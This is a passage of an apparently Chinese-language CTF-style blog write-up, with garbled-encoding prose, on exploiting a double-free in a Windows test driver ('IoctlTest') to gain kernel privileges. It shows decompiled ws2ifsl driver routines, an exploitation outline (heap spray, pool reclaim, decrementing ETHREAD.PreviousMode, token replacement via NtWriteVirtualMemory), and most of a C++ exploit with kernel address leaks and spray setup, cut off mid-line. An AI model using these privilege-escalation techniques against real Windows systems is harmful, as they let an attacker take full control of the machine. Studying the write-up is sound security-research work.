*)(MasterIrp + <span class="number">5</span>) != <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsSct&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsPvd&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ProcessFile = <span class="built_in">CreateProcessFile</span>((__int64)CurrentStackLocation-&gt;FileObject, a2-&gt;RequestorMode, MasterIrp);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v7 = <span class="number">-1073741811</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v5) = a2-&gt;RequestorMode;</span><br><span class="line">  ProcessFile = <span class="built_in">CreateSocketFile</span>(CurrentStackLocation-&gt;FileObject, v5, MasterIrp);</span><br><span class="line">LABEL_7:</span><br><span class="line">  v7 = ProcessFile;</span><br><span class="line">LABEL_9:</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  a2-&gt;IoStatus.Status = v7;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ws2ifsl!CreateProcessFileï¼Œä¸€ä¸ªtagä½Ws2Pçš„æ±  ProcData</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CreateProcessFile</span><span class="params">(PFILE_OBJECT pFileObj, KPROCESSOR_MODE Mode, <span class="keyword">struct</span> _IRP *Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  Blink = Irp-&gt;ThreadListEntry.Blink;</span><br><span class="line">  Flink = Irp-&gt;ThreadListEntry.Flink;</span><br><span class="line">  MasterIrp = Irp-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  Flags = *(<span class="type">void</span> **)&amp;Irp-&gt;Flags;</span><br><span class="line">LABEL_7:</span><br><span class="line">  Object = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="built_in">ObReferenceObjectByHandle</span>(Flags, <span class="number">0x10</span>u, (POBJECT_TYPE)PsThreadType, Mode, &amp;Object, <span class="number">0</span>i64);</span><br><span class="line">  _object = Object;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">IoThreadToProcess</span>((PETHREAD)Object);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="built_in">IoGetCurrentProcess</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      Pool2 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x61</span>i64, <span class="number">0x110</span>i64, <span class="string">&#x27;P2sW&#x27;</span>);</span><br><span class="line">      _Pool2 = Pool2;</span><br><span class="line">      <span class="keyword">if</span> ( Pool2 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)Pool2 = <span class="string">&#x27;corP&#x27;</span>;</span><br><span class="line">        *(_QWORD *)(Pool2 + <span class="number">8</span>) = <span class="built_in">PsGetCurrentProcessId</span>();</span><br><span class="line">        *(_DWORD *)(_Pool2 + <span class="number">0x100</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_QWORD *)(_Pool2 + <span class="number">0x108</span>) = <span class="number">1</span>i64;</span><br><span class="line">        <span class="built_in">LOBYTE</span>(_Mode) = Mode;</span><br><span class="line">        v12 = <span class="built_in">InitializeRequestQueue</span>(_Pool2, (<span class="type">int</span>)_object, _Mode, (<span class="type">int</span>)MasterIrp, Blink);</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(__Mode) = Mode;</span><br><span class="line">          v12 = <span class="built_in">InitializeCancelQueue</span>(_Pool2, (<span class="type">int</span>)_object, __Mode, (<span class="type">int</span>)Flink, Blink);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          pFileObj-&gt;FsContext = (PVOID)_Pool2;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>InitializeRequestQueue &amp;&amp; InitializeCancelQueue: åˆå§‹åŒ–Apcè¯·æ±‚&#x2F;å–æ¶ˆé˜Ÿåˆ—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeRequestQueue</span><span class="params">(PVOID Pool, PVOID a2, <span class="type">char</span> Mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)Pool + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">3</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">2</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)Pool + <span class="number">5</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = Mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)Pool + <span class="number">48</span>,</span><br><span class="line">      a2,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      RequestRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeCancelQueue</span><span class="params">(PVOID pool, PVOID obj, <span class="type">char</span> mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line">  PVOID ApcRoutine; <span class="comment">// [rsp+68h] [rbp+20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)pool + <span class="number">152</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">18</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">17</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)pool + <span class="number">20</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)pool + <span class="number">168</span>,</span><br><span class="line">      obj,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      CancelRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‡Šæ”¾çš„ä½ç½®åœ¨DispatchCloseå‡½æ•°ä¸­ <code>ExFreePoolWithTag</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  FsContext = (PVOID *)a2-&gt;Tail.Overlay.CurrentStackLocation-&gt;FileObject-&gt;FsContext;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)FsContext == <span class="string">&#x27;corP&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">ObfDereferenceObject</span>(FsContext[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">DereferenceProcessContext</span>(FsContext);</span><br><span class="line">LABEL_8:</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ± å¤§å° 0x110ï¼ŒåŠ ä¸ŠPoolHeaderå°±æ˜¯0x120</p>
<p><strong>åœ¨CloseHandleæ—¶ï¼Œè°ƒç”¨<code>ObfDereferenceObject</code>å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å°†è¿™ä¸ªä½ç½®ä¸Šçš„å€¼<code>-1</code>ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°†<code>ETHREAD.PreviousMode</code> ä» 1å‡ä¸º0ã€‚</strong></p>
<p>å› æ­¤å¤§è‡´æµç¨‹</p>
<ul>
<li>heap spray å‡å°‘ç¢ç‰‡</li>
<li>allocate ContiguousMemory &amp;&amp; MDL</li>
<li>free ContiguousMemory &amp;&amp; MDL</li>
<li>ä½¿ç”¨ ws2ifsl å ä½MDL (Ws2P ProcData)</li>
<li>double free ContiguousMemory &amp;&amp; MDL</li>
<li>ä½¿ç”¨Ioå ä½MDLï¼Œä¿®æ”¹Ws2Påç§»ä¸º28çš„å€¼ä¸º<code>ETHREAD.PreviousMode</code></li>
<li>CloseHandler å¯¼è‡´<code>ETHREAD.PreviousMode</code>ä¸º0</li>
<li>NtWriteVirtualMemory ä»»æ„åœ°å€å†™ï¼Œæ›¿æ¢token</li>
</ul>
<p>ä½†æ˜¯æ”¹æˆx86çš„ç¨‹åºåï¼Œå¯¼è‡´æ³„éœ²çš„EPROCESSåœ°å€è¢«æˆªæ–­ã€‚</p>
<p>å› æ­¤å®˜æ–¹ç»™å‡ºä¸‰ä¸ªæ–‡ä»¶</p>
<ul>
<li>helper.exe 64ä½ï¼Œä½¿ç”¨NtQuerySystemInfomationè·å–ä¿¡æ¯</li>
<li>poc.exe: 32ä½ï¼Œ</li>
<li>exp.exeï¼šè°ƒç”¨ä¸¤ä¸ªæ–‡ä»¶</li>
<li>ä½¿ç”¨äº†å‘½åç®¡é“è¿›è¡Œé€šä¿¡åŒæ­¥</li>
</ul>
<p>å¿…é¡»ç­‰å¾…å›æ”¶èµ„æºæ‰èƒ½å‡å»1</p>
<p>Nu1L æäº†ä¸€ä¸ªå…³é—­ dynbaseï¼Œé€šè¿‡è¿™ä¸ªä¹Ÿå¯ä»¥ä¿®æ”¹</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-170">&#x2F;DYNAMICBASEï¼ˆä½¿ç”¨åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–åŠŸèƒ½ï¼‰ | Microsoft Learn</a></li>
</ul>
<p>exp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Device </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE            <span class="string">L&quot;\\\\.\\IoctlTest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE32  0x9C402400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE32   0x9C402408</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE64  0x9C402404</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE64   0x9C40240C</span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate64</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Allocate64\r\n&quot;);</span></span><br><span class="line">	BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BYTE szOutBuffer[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PULONG)szInbuffer = uSize;</span><br><span class="line">	DWORD dwBytesReturned;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice, </span><br><span class="line">		IOCTL_ALLOCATE64, </span><br><span class="line">		szInbuffer, <span class="built_in">sizeof</span>(szInbuffer), </span><br><span class="line">		szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer), </span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE64\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate32</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Allocate32\r\n&quot;);</span></span><br><span class="line">	BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BYTE szOutBuffer[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PULONG)szInbuffer = uSize;</span><br><span class="line">	DWORD dwBytesReturned;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice,</span><br><span class="line">		IOCTL_ALLOCATE32,</span><br><span class="line">		szInbuffer, <span class="built_in">sizeof</span>(szInbuffer),</span><br><span class="line">		szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer),</span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE32\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (!ulInputBufferLength || !ulOutputBufferLength)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	v3 = 0xC000000D;</span></span><br><span class="line"><span class="comment">//	goto LABEL_34;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function">VOID <span class="title">Free64</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Free64\r\n&quot;);</span></span><br><span class="line">	BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		 g_hDevice, </span><br><span class="line">		IOCTL_RELEASE64, </span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE64\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// wprintf(L&quot;first free succeeded, dwOutput = %d\n&quot;, dwOutput);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Free32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Free32\r\n&quot;);</span></span><br><span class="line">	BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice,</span><br><span class="line">		IOCTL_RELEASE32,</span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE32\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get Kernel Infomation</span></span><br><span class="line">ULONG64   g_SystemEprocess;</span><br><span class="line">ULONG64   g_CurrentEprocess;</span><br><span class="line">ULONG64   g_ExploitEthread;</span><br><span class="line"></span><br><span class="line">HANDLE    g_ThreadExploitHandle;</span><br><span class="line">DWORD     g_CurrentPid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NtQuerySystemInfomation Leak Information</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_TABLE_ENTRY_INFO</span> &#123;</span><br><span class="line">	USHORT UniqueProcessId;</span><br><span class="line">	USHORT CreatorBackTraceIndex;</span><br><span class="line">	UCHAR ObjectTypeIndex;</span><br><span class="line">	UCHAR HandleAttributes;</span><br><span class="line">	USHORT HandleValue;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	ULONG GrantedAccess;</span><br><span class="line">	LONG __PADDING__[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG NumberOfHandles;</span><br><span class="line">	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation			(SYSTEM_INFORMATION_CLASS)0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformation			(SYSTEM_INFORMATION_CLASS)0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">LeakByQuerySystemInfomation</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD CurPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">	g_CurrentPid = CurPid;</span><br><span class="line">	<span class="comment">// Process</span></span><br><span class="line">	HANDLE hSelf = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, <span class="number">0</span>, CurPid);</span><br><span class="line">	<span class="keyword">if</span> (hSelf == INVALID_HANDLE_VALUE || hSelf == <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error OpenProcess\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// kthread and ktoken</span></span><br><span class="line">	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	ULONG OutBufLen = <span class="number">0</span>;</span><br><span class="line">	NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, <span class="number">0x100</span>, &amp;OutBufLen);</span><br><span class="line">	<span class="keyword">if</span> (status == STATUS_INFO_LENGTH_MISMATCH) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(HandleInfo);</span><br><span class="line">		HandleInfo = (SYSTEM_HANDLE_INFORMATION*)<span class="built_in">malloc</span>(OutBufLen);</span><br><span class="line">		status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, OutBufLen, &amp;OutBufLen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HandleInfo == <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtQuerySystemInformation SystemHandleInformation\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// å½“å‰è¿›ç¨‹çš„ä¿¡æ¯</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line">		<span class="keyword">if</span> (handleInfo.UniqueProcessId == CurPid)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] PID %d\t EPROCESS %#llx\n&quot;</span>, handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// æ‰¾åˆ° ExploitThread çš„ETHREAD</span></span><br><span class="line">	<span class="comment">// æ‰¾åˆ°Systemçš„ EPROCESS</span></span><br><span class="line">	<span class="comment">// æ‰¾åˆ°å½“å‰è¿›ç¨‹çš„ EPROCESS</span></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)g_ThreadExploitHandle)</span><br><span class="line">		&#123;</span><br><span class="line">			g_ExploitEthread = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread PID: %d\thandle: %#x\t_KTHREAD: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// å½“å‰è¿›ç¨‹ Eprocess</span></span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)hSelf) </span><br><span class="line">		&#123;</span><br><span class="line">			g_CurrentEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Current PID: %d\thandle: %#x\t_EPROCESS: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// System è¿›ç¨‹ Eprocess</span></span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == <span class="number">0x4</span> &amp;&amp; HandleEntry.HandleValue == <span class="number">0x4</span>) </span><br><span class="line">		&#123; <span class="comment">// SYSTEM Process has a handle to itself</span></span><br><span class="line">			g_SystemEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] System _EPROCESS: 0x%llx\r\n&quot;</span>, g_SystemEprocess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (g_ExploitEthread != <span class="number">0</span> &amp;&amp; g_CurrentEprocess != <span class="number">0</span> &amp;&amp; g_SystemEprocess) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(HandleInfo);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Get kthread and ktoken</span></span><br><span class="line">	<span class="keyword">if</span> (g_ExploitEthread == <span class="number">0</span> || g_CurrentEprocess == <span class="number">0</span> || g_SystemEprocess == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error Leak\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ws2ifsl</span></span><br><span class="line"><span class="comment">// wdm.h</span></span><br><span class="line"><span class="comment">// ç»“æ„æä¾›æ‰©å±•å±æ€§ (EA) ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG NextEntryOffset;</span><br><span class="line">	UCHAR Flags;</span><br><span class="line">	UCHAR EaNameLength;</span><br><span class="line">	USHORT EaValueLength;</span><br><span class="line">	CHAR EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROC_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE ApcThread;          <span class="comment">// 0x00</span></span><br><span class="line">	PVOID RequestQueueRoutine; <span class="comment">// 0x04</span></span><br><span class="line">	PVOID CancelQueueRoutine;  <span class="comment">// 0x08</span></span><br><span class="line">	PVOID ApcContext;          <span class="comment">// 0x0C</span></span><br><span class="line">	PVOID unknown3;            <span class="comment">// 0x10</span></span><br><span class="line">&#125; PROC_DATA, * PPROC_DATA;</span><br><span class="line"></span><br><span class="line">HANDLE g_ThreadApcHandle;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray Ws2P</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayWs2P      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray NpFr</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayPipe      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray tag IO</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayEaFile    = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set to cpu number later</span></span><br><span class="line">DWORD CountConcurrentSprayEaFile  = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayMm        = <span 